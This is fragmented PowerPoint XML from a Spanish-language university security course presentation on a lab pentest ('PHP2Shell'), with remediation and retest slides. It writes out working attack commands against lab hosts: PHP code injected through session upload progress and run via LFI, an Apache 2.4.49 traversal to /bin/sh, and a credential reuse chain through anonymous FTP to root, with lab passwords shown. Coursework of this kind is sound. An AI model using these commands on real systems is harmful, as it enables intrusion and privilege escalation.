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PHP2Shell en PHP 8.4.26: se explota por Chain A, se obtiene www-data, se escala por B3/SSH/sudo y se cierra con parche y retest. La demo se hace en vivo desde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por fases. Fase 1 configuración y superficie; Fase 2 exploración con comandos; Fase 3 explotación W2; Fase 4 mitigación por máquina; Fase 5 retest y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Contexto. Destacar el alcance autorizado y la red universitaria. Los números clave: 6 servidores, 24 hallazgos, 22 llevados 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Arquitectura. Explicar el camino: M6 entra por M1:80, M1 pivota a M2/M3/M4 y M5 se alcanza por VNC. Señalar la desviación de firewall: 445 de M4 y 5900 de M5 visibles desde el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Activos. Tabla ordenada por máquina: IP, rol, puertos y versión. M1 es la puerta; M2/M3 datos y respaldos; M4/M5 Windows; M6 auditor; R0 transporte.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es la puerta. Aquí se concentran W2 Chain A, W3, W4 y SSH. Erick expone esta máquina y la ficha de PHP2Shell.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M2. Doris expone base de datos y Redis: acceso sin auth, volcado por túnel y remediación a 6.2.7.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M3. Rony expone los respaldos: FTP anónimo, NFS sin root_squash y la clave que termina en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M4. Fabiola expone el Windows heredado: S3, AXFR, signing y el nivel SYSTEM con credenciales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M5. Marco expone la estación cliente: VNC sin autenticación, whoami y marcador; M5 queda pendiente de remediación por filtrado.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M6. Jose expone la estación de auditoría: herramientas, FTP de artefactos y generación de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Reparto. Cada uno tiene una parte de PHP2Shell y su máquina. Erick ficha, Doris precondiciones, Rony offsets, Fabiola session injection, Marco LFI/ejecución, Jose root y retest.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Metodología. Recorrer F0–F7 y detenerse en el version gate. W2 tenía versión vulnerable y el servicio explotado cumplía las condiciones: NTS, prefork y offsets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PHP2Shell. Explicar los dos CVE, por qué llama la atención y cómo se conecta con la cadena: version gate, servicio 8080, Chain A, www-data, B3/SSH/sudo y retest.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Ficha. Dos CVE en la misma familia. CVSS 9.8 en v3.1 para el principal y 8.1 para el segundo. Impacto: RCE como www-data y disclosure de memoria. Todo parte de una versión dentro del rango.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gate. 8.4.26 está entre 8.4.0 y 8.4.26; el fix es 8.4.27. El servicio expuesto corre con NTS y prefork, así que el gate confirma versión y condiciones antes de explotar.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Precondiciones. Las seis se verificaron sobre el servicio explotado: NTS, prefork, display_errors, memory_limit 16M, session.upload_progress y offsets del libphp.so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Servicio explotado. Es PHP 8.4.26 NTS sobre Apache 2.4.49 prefork, publicado en 8080. Presenta display_errors, memory_limit 16M, session.upload_progress y session2.php con HTTP 200. La evidencia es EV-W2-01.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Configuración y offsets. Enfatizar que los offsets se derivan con nm del libphp.so real. Si se copian de un writeup de Debian, el PoC falla. htdata lo reporta el propio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 A paso a paso. Explicar que session.upload_progress deja el archivo de sesión y el LFI lo incluye. Sin LFI no hay ejecución: esa es la condición que se declara.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Comandos de Chain A. Ejecutar en vivo desde Kali o M1. Paso 1 crea la sesión; paso 3 incluye el archivo; paso 4 ejecuta id; paso 5 escala con la clave de B3 y sudo.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W3. Mostrar el curl con traversal y CGI. La salida es www-data. Es la segunda vía a M1 y sirve de respaldo si PHP2Shell fallara en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B3. Mostrar la descarga de credenciales.txt y la reutilización en ubuntu. Luego sudo id. Es el paso que lleva de www-data a root en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Evidencia. EV-W2-07 documenta Chain A y www-data. EV-W2-09 documenta la cadena B3, SSH y sudo hasta root. Cada evidencia tiene log, captura y SHA256.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Impacto. W2 dio www-data por Chain A; W3 también dio www-data; root se cierra por B3, SSH y sudo. La cadena real está documentada y no se atribuye a W2.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Cadena completa. Paso 1: W2 Chain A en M1. Paso 2: www-data y marcador. Paso 3: B3 en M3 entrega Admin13.-. Paso 4: SSH ubuntu en M1. Paso 5: sudo y root. Todo se puede ejecutar en vivo desde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Otros hallazgos. Recorrer M2–M5 en 30 segundos cada uno. Aclarar que M4 llegó a SYSTEM con credenciales de admin; no cuenta como privesc desde acceso limitado.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Remediación. Recorrer la tabla por máquina: versión antes, versión/configuración después y estado. M1–M4 cerrados; M5 filtrado y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Retest con comandos. M1: php 8.4.27 y lfi 404. M2: NOAUTH y puerto filtrado. M3: FTP 530 y root_squash. M4: signing True y AXFR falla. M5: puertos filtrados,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Lecciones. Cerrar con las cuatro ideas. La más importante: el fallo documentado vale más que un éxito inventado. Y mitigar por configuración no es parchear la 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tres ideas: W2 logró RCE por Chain A, la condición LFI se declara, y M1–M4 quedaron parcheados y retestados. Abrir preguntas y pasar a la réplica.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188720"/>
            <a:ext cx="4206240" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00B8D9">
              <a:alpha val="18000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="00B8D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00B8D9">
              <a:alpha val="12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FINAL · UNIDAD I · SEMANA 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PHP2Shell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CVE-2026-109618  ·  CVE-2026-109619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version gate a la explotación controlada de PHP 8.4.26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Análisis, explotación y remediación de la red universitaria.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66760" y="1417320"/>
            <a:ext cx="3063240" cy="2926080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3750"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10325A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5B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AFECTADO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41080" y="2011680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ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5B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96528" y="2084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96528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2.4.49 · prefork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41080" y="27249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ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5B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2798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6528" y="2999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8.4.26 · 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41080" y="3438144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ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5B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3511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37124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session2.php @ :8080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41080" y="4160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pre-auth como www-data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APAZA ANAHUA, DORIS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ANCCO RAFAEL, FABIOLA ANDREA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8640" y="4956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RAMOS VERA, ERICK JEAN PIER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977640" y="45537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CRUZ, MARCO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977640" y="47548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CHURATA HUACANI, RONY FRANK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977640" y="4956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 MAMANI, JOSE ENRIQUE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548640" y="544068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MOQUEGUA  ·  INGENIERÍA DE SISTEMAS E INFORMÁTICA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5687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Mgr. Juan Carlos Valero Gómez  ·  2026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10.10.10.0/24 · 6 servidores · evidencia fechada en UTC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fases, una historia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configuración de la red a la explotación de W2 y su mitigación.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61872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Configuración y superficie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0" y="17647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Red, topología, activos, puertos y versiones de cada máquina.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97480"/>
            <a:ext cx="384048" cy="38404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61872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Exploración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0" y="26334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comandos por máquina: qué servicio corre y qué devuelve.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E8FAFC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566160"/>
            <a:ext cx="384048" cy="38404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61872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Explotación PHP2Shell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35021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Ficha, version gate, Chain A, www-data y root.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434840"/>
            <a:ext cx="384048" cy="38404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61872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· Mitigación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20640" y="43708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o configuración por máquina y comando de verificación.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303520"/>
            <a:ext cx="384048" cy="38404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61872" y="5212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· Retest y cierre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20640" y="5239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Antes/después, evidencia, lecciones y réplica.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0533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Tesis: de la versión vulnerable a root, con evidencia en cada fase.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CONTEXTO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universitaria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reales, datos de la universidad y un atacante dentro de la red.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universitaria expone un portal web, base de datos, respaldos, un Windows heredado y estaciones de trabajo. Todo en 10.10.10.0/24; M6 es el punto de auditoría desde donde se valida la superficie.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92024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10.10.10.0/24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3611880"/>
            <a:ext cx="1783080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 714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corporativa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3611880"/>
            <a:ext cx="1691640" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 714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611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activos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544568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Identificar, enumerar, explotar, escalar a root, remediar y verificar. Cada paso queda con comando, captura y hash para poder repetirlo en vivo desde Kali.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160020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76479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90956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09560" y="2167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M1–M6 + router R0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301752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318211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90956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09560" y="3584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CVE + 15 configuraciones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37960" y="443484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59943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909560" y="4690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explotadas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9560" y="5001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evidencia verificable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ARQUITECTURA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Topología de la red y camino de ataque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puerta web, separación lógica por firewall y pivote desde M1.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43400" y="141732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1517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 · MitraStar  10.10.10.1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175564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 · DHCP OFF · sin DSL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2395728"/>
            <a:ext cx="10469880" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="9DB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9048" y="2075688"/>
            <a:ext cx="0" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="9DB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148840"/>
            <a:ext cx="20116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10.10.10.0/24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0" y="2395728"/>
            <a:ext cx="0" cy="512064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2907792"/>
            <a:ext cx="1554480" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E8F0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" y="3291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· auditoría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78408" y="352958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· nxc · curl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3685032" y="2395728"/>
            <a:ext cx="0" cy="512064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07792" y="2907792"/>
            <a:ext cx="1554480" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 678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17520" y="3291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017520" y="352958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· 443 · 22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3749040" y="2487168"/>
            <a:ext cx="658368" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 71429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4871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724144" y="2395728"/>
            <a:ext cx="0" cy="512064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46904" y="2907792"/>
            <a:ext cx="1554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56632" y="3291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056632" y="352958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 · Redis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7763256" y="2395728"/>
            <a:ext cx="0" cy="512064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986016" y="2907792"/>
            <a:ext cx="1554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52944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95744" y="3291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Respaldos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095744" y="352958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· SMB · NFS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9802368" y="2395728"/>
            <a:ext cx="0" cy="512064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025128" y="2907792"/>
            <a:ext cx="1554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34856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592056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34856" y="32918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9134856" y="352958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· SMB · Spooler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3685032" y="3986784"/>
            <a:ext cx="0" cy="50292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685032" y="4489704"/>
            <a:ext cx="1207008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892040" y="4489704"/>
            <a:ext cx="0" cy="310896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749040" y="4224528"/>
            <a:ext cx="82296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160520" y="4800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B8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0" y="4901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 .15  ·  Windows 10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97680" y="5157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 cliente · SMB1 · RDP sin NLA · TightVNC 2.8.90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297680" y="54681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 final de la cadena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229600" y="4069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4187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Leyenda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412480" y="4480560"/>
            <a:ext cx="201168" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00B8D9"/>
          </a:solidFill>
          <a:ln w="10160">
            <a:solidFill>
              <a:srgbClr val="00B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05088" y="4434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/ pivote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412480" y="4754880"/>
            <a:ext cx="201168" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A2342"/>
          </a:solidFill>
          <a:ln w="10160">
            <a:solidFill>
              <a:srgbClr val="0A23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5088" y="47091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de entrada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412480" y="5029200"/>
            <a:ext cx="201168" cy="146304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05088" y="4983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412480" y="5303520"/>
            <a:ext cx="201168" cy="14630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05088" y="52578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 internos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686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separación es lógica, no física: M4:445 y M5:5900 quedaron visibles desde M6 y se documentaron como desviación.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ACTIVOS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tiene cada máquina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rol, puertos y versión clave antes de explorar.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971800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84632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858000" y="15361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/ VERSIÓN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1810512"/>
            <a:ext cx="11064240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01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10.10.10.11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971800" y="1901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84632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· 80 · 8080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858000" y="190195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2.4.49 · PHP 8.4.26 · WP 7.0.1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24688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10.10.10.12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71800" y="2468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3306 · 6379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6858000" y="24688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 10.11.19 · Redis 6.2.6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48640" y="2944368"/>
            <a:ext cx="11064240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30358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10.10.10.13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71800" y="3035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Respaldos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484632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· 139 · 445 · 2049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858000" y="303580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 4.5.10 · vsftpd 2.3.4 · NFS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40080" y="36027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360273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10.10.10.14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2971800" y="36027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84632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445 · 53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858000" y="3602736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WS2016 14393 · DNS · SMB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48640" y="4078224"/>
            <a:ext cx="11064240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169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37360" y="416966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10.10.10.15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2971800" y="41696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4846320" y="4169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3389 · 5900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858000" y="416966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 19045 · TightVNC 2.8.90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400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37360" y="47365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10.10.10.20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971800" y="47365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484632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858000" y="473659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· nmap · nxc · curl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48640" y="5212080"/>
            <a:ext cx="11064240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303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37360" y="5303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2971800" y="5303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484632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858000" y="53035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MitraStar · DHCP off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548640" y="59893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no es objetivo; R0 solo transporta. Las versiones son las que activan el version gate.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 · M1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Aplicación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puerta web de la universidad y el punto de pivote.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9204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aplicación: publica WordPress y Moodle, concentra la base de datos y es la única entrada web (80/443). Desde aquí se pivota al resto.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INSTALADO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49808" y="294436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Ubuntu 22.04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Apache 2.4.49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345643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PHP 8.4.26 (NTS)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9808" y="371246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WordPress 7.0.1 · Moodle 5.0.11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49808" y="39684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OpenSSH · usuario ubuntu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59893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Y CVE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870448" y="1956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944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CVE-2026-109618/109619 · PHP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92124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Chain A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870448" y="23774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0" y="2377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CVE-2021-41773 · Apache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921240" y="2377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70448" y="279806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9440" y="27980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débil usc.admin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921240" y="27980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0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870448" y="32186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M1-SSH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944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reutilizada + sudo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21240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HICIMOS:  W2 Chain A dio www-data; W3 dio RCE; W4 login admin; SSH + sudo dio root.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608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· 2 COMANDOS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7315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nmap -sV -p 80 10.10.10.11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7315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80/tcp open http Apache 2.4.49 (Unix) PHP/8.4.26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7315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Confirma la puerta web y la versión exacta de PHP.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62179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curl -s -o /dev/null -w "%{http_code}" http://10.10.10.11:8080/session2.php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62179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200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62179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Comprueba que el target de sesión responde antes de atacar.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731520" y="60167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Evidencia: EV-W2-07/08/09 · EV-005-M1-03 · EV-ROOT-CHAIN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Erick Ramos Vera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 · M2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Base de datos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WordPress y Moodle; Redis para sesiones.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9204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base de datos: MariaDB guarda wordpress y moodle_db; Redis se usa para sesiones y caché. Es el objetivo del pivote desde M1.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INSTALADO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49808" y="294436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Ubuntu 22.04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MariaDB 10.11.19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345643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Redis 6.2.6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9808" y="371246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SNMP public/private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49808" y="39684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3306/6379 en la LAN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59893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Y CVE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870448" y="1956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944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sin autenticación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92124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PONG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870448" y="23774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0" y="2377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de BD en wp-config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921240" y="2377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70448" y="279806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9440" y="27980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6379/3306 expuestos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921240" y="27980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0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pivote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HICIMOS:  Redis respondió PONG sin auth; por túnel SSH se leyó wordpress (12 tablas) y moodle_db (487).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608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· 2 COMANDOS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315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redis-cli -h 10.10.10.12 PING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7315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PONG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315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Redis responde sin autenticación.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62179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redis-cli -h 10.10.10.12 INFO server | grep redis_version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62179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redis_version:6.2.6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2179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Confirma la versión del servicio y el vector de acceso.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731520" y="60167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Evidencia: F04-001 · F04-003 · EV-007-RETEST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Doris Apaza Anahua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 · M3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Respaldos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backup que guarda la llave de M1 y M4/M5.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9204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respaldos: FTP, NFS y Samba. Guarda copias de las bases y archivos; es el eslabón que entrega credenciales reutilizadas.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INSTALADO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49808" y="294436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Ubuntu 22.04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Samba 4.5.10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345643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vsftpd 2.3.4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9808" y="371246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NFS · /srv/storage/backups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49808" y="39684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OpenSSH · rony123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59893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Y CVE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870448" y="1956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944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anónimo + credenciales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92124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expl.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870448" y="23774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0" y="2377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NFS no_root_squash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921240" y="2377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HICIMOS:  FTP anónimo entregó Admin13.-; NFS permitió escribir como root; esa clave abrió M1.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08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· 2 COMANDOS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315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curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt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7315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admin M4/M5: Admin13.-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315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El FTP anónimo expone credenciales en claro.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62179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showmount -e 10.10.10.13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2179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/srv/storage/backups 10.10.10.0/24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2179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Lista el export NFS y confirma el punto de escritura.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731520" y="60167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Evidencia: F04-002 · F04-006 · EV-ROOT-CHAIN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Rony Churata Huacani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 · M4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Windows Server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heredada, DNS y SMB sin firmar.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9204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2016 heredado: DNS de uni.lab, SMBv1, Spooler y comparticiones. Es el salto a Windows y la identidad administrativa.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INSTALADO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49808" y="294436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WS2016 build 14393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DNS standalone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345643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SMBv1 · signing off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9808" y="371246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Spooler activo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49808" y="39684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Administrador / soporte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59893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Y CVE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870448" y="1956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944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 clave débil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92124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Pwn3d!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870448" y="23774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0" y="2377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AXFR abierto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921240" y="2377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HICIMOS:  S3 dio Pwn3d! y shares; AXFR entregó la zona; SYSTEM por tarea programada.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08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· 2 COMANDOS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315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nmap -p445 --script smb-security-mode 10.10.10.14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7315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message_signing: disabled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315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SMB sin firma; superficie para el acceso.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62179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dig axfr uni.lab @10.10.10.14 +short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2179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app.uni.lab. 10.10.10.11 / bkp.uni.lab. 10.10.10.13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2179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Transferencia de zona: mapa completo de la red.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731520" y="60167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Evidencia: F04-012/013/015/016/017 · EV-007-RETEST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Fabiola Ancco Rafael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 · M5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Cliente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estación del usuario y el control gráfico.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9204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 cliente Windows 10: navegador, SMB, RDP y TightVNC. Es el destino final de la cadena y el impacto sobre el usuario.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INSTALADO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49808" y="294436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Windows 10 21H2 · 19045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SMBv1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345643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RDP sin NLA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9808" y="371246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TightVNC 2.8.90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49808" y="39684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cliente / Admin13.-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59893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Y CVE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870448" y="1956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944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reutilizada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92124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870448" y="23774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0" y="2377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VNC sin autenticación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921240" y="2377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HICIMOS:  VNC sin clave abrió el escritorio; whoami confirmó desktop-dt5f05n\cliente; se dejó el marcador PWNED-M5.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08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· 2 COMANDOS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315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nmap -sV -p5900 10.10.10.15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7315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5900/tcp open vnc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315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VNC expuesto en la estación cliente.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62179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nmap -p5900 --script vnc-info 10.10.10.15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2179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Security types: None · WARNING: no authentication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2179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Confirma que el escritorio no pide clave.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731520" y="60167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Evidencia: F04-008/011 · F05-001 · EV-007-RETEST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Marco Nina Cruz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 · M6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Auditoría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Kali: el punto de partida y la evidencia.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9204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 de auditoría: no es objetivo. Ejecuta reconocimiento, escaneo, explotación, transferencia de artefactos y captura de evidencia.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INSTALADO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49808" y="294436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Kali Linux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nmap · whatweb · wpscan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345643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nxc · redis-cli · smbclient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9808" y="371246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curl · ssh · vncviewer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49808" y="39684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FTP de artefactos :2121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59893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Y CVE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870448" y="1956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944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objetivo del ataque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92124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HICIMOS:  Se ejecutaron escaneos, PoCs, túneles y capturas; M6 aloja el FTP de artefactos y los logs con SHA256.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608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· 2 COMANDOS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315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nmap -sn 10.10.10.0/24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315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Nmap done: 256 IP addresses (7 hosts up)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7315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Descubre los hosts activos de la red.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6217920" y="482803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nmap -sV -p80 10.10.10.11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217920" y="51572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80/tcp open http Apache 2.4.49 · PHP/8.4.26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6217920" y="5468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hace: Valida la puerta y la versión desde el auditor.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731520" y="60167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Evidencia: LOG-000-04…08 · EV-000-10/11 · galería de evidencias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Jose Paye Mamani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PHP2Shell en seis partes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integrante expone su máquina y una parte del caso W2.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92808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7647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Erick · M1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Ficha, CVSS, EPSS y version gate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892808"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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17647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Doris · M2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Precondiciones: NTS, prefork y php.ini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53949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18688"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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0906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Rony · M3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Offsets reales y servicio 8080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2926080"/>
            <a:ext cx="53949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218688"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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30906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Fabiola · M4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A: session injection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53949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544568"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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544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44165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· M5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754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LFI, comando y explotación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4251960"/>
            <a:ext cx="53949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4544568"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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544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44165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 · M6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754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Evidencia, root por B3/SSH/sudo y retest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exposición sigue el orden de la cadena: versión → precondiciones → offsets → sesión → LFI → root y retest.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fases técnicas + informe final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flecha tiene una puerta de versión: sin comparar instalada, rango y fix, no se avanza.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557784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· activos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828800" y="2121408"/>
            <a:ext cx="118872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47672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02536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Reconocimiento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002536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· versiones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273552" y="2121408"/>
            <a:ext cx="118872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92424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47288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Enumeración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447288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· usuarios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718304" y="2121408"/>
            <a:ext cx="118872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37176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892040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· configuración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163056" y="2121408"/>
            <a:ext cx="118872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81928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00B8D9"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="00B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6792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Explotación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336792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· impacto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607808" y="2121408"/>
            <a:ext cx="118872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26680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81544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Remediación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781544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 o config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9052560" y="2121408"/>
            <a:ext cx="118872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71432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1432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26296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9226296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después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10497312" y="2121408"/>
            <a:ext cx="118872" cy="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616184" y="16916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0A2342"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="0A23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16184" y="1783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671048" y="20299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10671048" y="22677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· réplica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48640" y="2971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GATE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291840"/>
            <a:ext cx="2633472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3429000"/>
            <a:ext cx="347472" cy="347472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70432" y="3429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instalada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3232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-v, httpd -V, wp core version,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smbd --version, winver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364992" y="3291840"/>
            <a:ext cx="2633472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9584" y="3429000"/>
            <a:ext cx="347472" cy="347472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29584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986784" y="3429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vulnerable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529584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 / CVE.org con fecha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CVSS declarado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81344" y="3291840"/>
            <a:ext cx="2633472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45936" y="3429000"/>
            <a:ext cx="347472" cy="347472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45936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03136" y="3429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que corrige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45936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instalada contra fix;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≥, el CVE no cuenta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997696" y="3291840"/>
            <a:ext cx="2633472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62288" y="3429000"/>
            <a:ext cx="347472" cy="347472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62288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619488" y="3429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162288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explotable / versión sí,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verificadas / no aplica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48640" y="47548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7240" y="4754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 si la instalada es igual o mayor que la que corrige, el CVE no se cuenta como profundidad.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4864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fue el caso donde la versión estaba dentro del rango y el servicio explotado cumplía las condiciones: NTS, prefork y offsets reales. El gate confirmó versión y condiciones antes de ejecutar.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EL CASO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PHP2Shell y por qué importa?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CVE de PHP 8.4.26 que se convierten en una cadena de explotación real.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19072"/>
            <a:ext cx="384048" cy="38404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07008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Dos CVE de corrupción de memoria en PHP 8.4.26.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Ejecución remota antes de autenticarse.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Chain A: session injection + LFI.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Resultado: www-data.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71907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 VOLVIÓ VIRAL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Versión muy extendida en servidores web.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4434840" y="28346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Ataque remoto, pre-auth y de baja complejidad.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434840" y="33375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PoC reproducible y CVSS 9.8.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434840" y="38404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 historia de PHP a root se comunica sola.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955280" y="155448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719072"/>
            <a:ext cx="384048" cy="38404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13648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RELACIONA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8160" y="233172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Version gate: 8.4.26 &lt; 8.4.27.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8138160" y="28346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Servicio 8080 con NTS y prefork.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8138160" y="33375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Chain A dio www-data.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8138160" y="38404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B3, SSH y sudo dieron root.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8138160" y="434340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Parche 8.4.27 y retest.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138160" y="5029200"/>
            <a:ext cx="1417320" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7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5029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4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PRINCIPAL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48640" y="5650992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650992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fue el caso principal: RCE pre-auth, CVSS 9.8 y cadena a root. No es solo un CVE: es una cadena.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326880" y="56509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hallazgos · 22 con evidencia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Erick Ramos Vera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FICHA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PHP2Shell en una página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CVE de corrupción de memoria en PHP 8.4.26, explotables antes de autenticarse.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008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965960" y="16733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10.10.10.11 · m1-app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77240" y="2020824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848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1965960" y="2066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8.4.26 en mod_php sobre Apache 2.4.49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77240" y="2414016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78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1965960" y="24597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CVE-2026-109618 · CVE-2026-109619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7240" y="2807208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71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965960" y="2852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CWE-416 · CWE-755 · CWE-824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7240" y="3200400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64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AFECTADAS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1965960" y="32461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8.4.0–8.4.26 (también 8.2, 8.3, 8.5)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7240" y="3593592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57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965960" y="36393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8.4.27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3986784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507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BINARIO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965960" y="40325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libphp.so del servidor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7240" y="4379976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4439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965960" y="4425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php2shell-poc (validado)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77240" y="4773168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371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EPSS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965960" y="48188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n/d al 2026-10-27: CVE reciente sin puntuación pública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7240" y="5166360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230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RELACIONADOS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965960" y="52120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CVE-2026-109619 (misma familia) · CVE-2021-41773 (W3)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" y="5559552"/>
            <a:ext cx="5943600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="10160">
            <a:solidFill>
              <a:srgbClr val="EEF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6235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965960" y="56052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www-data + root por B3/sudo · parcheado 8.4.27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69480" y="1554480"/>
            <a:ext cx="4343400" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444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v3.1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8080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4600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="91440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CVE-2026-109618 · crítica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pre-auth como www-data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98080" y="2761488"/>
            <a:ext cx="3886200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5B8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2862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 ·  CVE-2026-109619 (v3.1)  /  9.2 en v4.0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98080" y="3063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Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H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74980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20" i="1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mezclan métricas: cada ficha declara su versión de CVSS.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7269480" y="3749040"/>
            <a:ext cx="434340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858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declarado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4187952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863840" y="41788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remota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63840" y="43799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autenticarse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52360" y="471830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863840" y="4709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863840" y="4910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del worker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452360" y="5248656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5248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863840" y="5239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Salto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863840" y="5440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de M2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" y="61996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versión instalada está dentro del rango afectado: el version gate la marca vulnerable antes de tocar el PoC.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Erick Ramos Vera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VERSION GATE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8.4.26 está dentro del rango; 8.4.27 corrige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comparación se hace antes del PoC y se documenta con evidencia.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9966960" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="381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039112"/>
            <a:ext cx="6812280" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="635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VULNERABLE · 8.4.0 – 8.4.26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61288" y="2212848"/>
            <a:ext cx="237744" cy="237744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62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del rango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18888" y="2212848"/>
            <a:ext cx="237744" cy="237744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8.4.26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5196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instalada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476488" y="2212848"/>
            <a:ext cx="237744" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E9F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8.4.27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0956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47472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INSTALADA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41879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del rango afectado. El servicio expuesto corre con NTS y prefork.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15968" y="3520440"/>
            <a:ext cx="347472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17136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17136" y="41879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instalada es menor que el fix: el CVE cuenta como vulnerable.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83296" y="3520440"/>
            <a:ext cx="3529584" cy="1508760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 606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84464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sí · condiciones verificadas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84464" y="4187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7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cumple las condiciones; la explotación se documenta con evidencia.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gate no dice “hay un CVE”: dice qué versión hay, si está dentro del rango, qué la corrige y qué evidencia lo demuestra.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Erick Ramos Vera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PRECONDICIONES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PoC no corre con cualquier PHP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condiciones que el servicio explotado presenta en producción.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764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Safety disabled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corre sin Thread Safety.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79392" y="160020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01184" y="1764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MPM prefork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62272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usa MPM prefork.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10144" y="160020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1783080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31936" y="1764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display_errors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31936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93024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muestra errores en la respuesta.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474720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70432" y="3456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memory_limit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del proceso PHP del servicio.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79392" y="3291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3474720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01184" y="3456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session.upload_progress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01184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· cleanup Off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62272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de la corrupción en el servicio.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10144" y="3291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736" y="3474720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74736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31936" y="3456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31936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zif_system · zval_ptr_dtor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193024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libphp.so del servidor, no de otro build.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074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PoC: comando ≤ 14 bytes   ·   Chain A: sesión compartida + sink LFI (/lfi.php).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59436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condiciones se verificaron con php -i, httpd -V y nm sobre el servicio antes de ejecutar el PoC.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Doris Apaza Anahua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SERVICIO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8.4.26 en el puerto 8080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que se explotó: Apache 2.4.49 prefork y PHP 8.4.26 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37960" cy="3749040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 243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160020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:8080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9808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8.4.26 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017520" y="2606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2.4.49 · MPM prefork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017520" y="3108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8.4.26 NTS · Thread Safety disabled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display_errors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017520" y="3611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· memory_limit 16M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session.upload_progress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017520" y="4114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· cleanup Off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session2.php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01752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200 · sesión compartida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315200" y="1572768"/>
            <a:ext cx="42976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1737360"/>
            <a:ext cx="114300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1737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516368" y="20848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10.10.10.11:8080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43800" y="2560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index.php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55548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web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543800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session2.php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555480" y="3127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compartida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543800" y="3694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lfi.php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555480" y="3694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inclusión local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543800" y="4261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/tmp/sess_*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555480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en disco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4068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 PHP 8.4.26 NTS sobre Apache 2.4.49 prefork, con el php.ini y los offsets del binario real.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Doris Apaza Anahua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CONFIGURACIÓN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php.ini y offsets del binario real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offsets no se copian de Internet: se derivan del libphp.so del servidor M1.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806440" cy="3749040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 195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647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php.ini efectivo · servicio :8080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memory_limit = 16M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display_errors = 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91693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max_input_vars = 5000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30098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session.upload_progress.enabled = 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68503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session.use_cookies =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session.use_strict_mode = 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4531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session.upload_progress.cleanup = Off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 con php -i sobre el handler de Apache, no solo por CLI.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29400" y="16459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Símbolos y offsets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201168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103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06840" y="2103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0x52e6f0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84848" y="2377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system() del módulo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288036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2971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zval_ptr_dtor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06840" y="2971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0x72ffd0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3246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destructor en la corrupción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29400" y="37490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3840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06840" y="3840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0x6e0d8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84848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hash reportada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470916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4828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 libphp.so | grep -E 'zif_system|zval_ptr_dtor'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84848" y="504748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000000000052e6f0 t zif_system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4848" 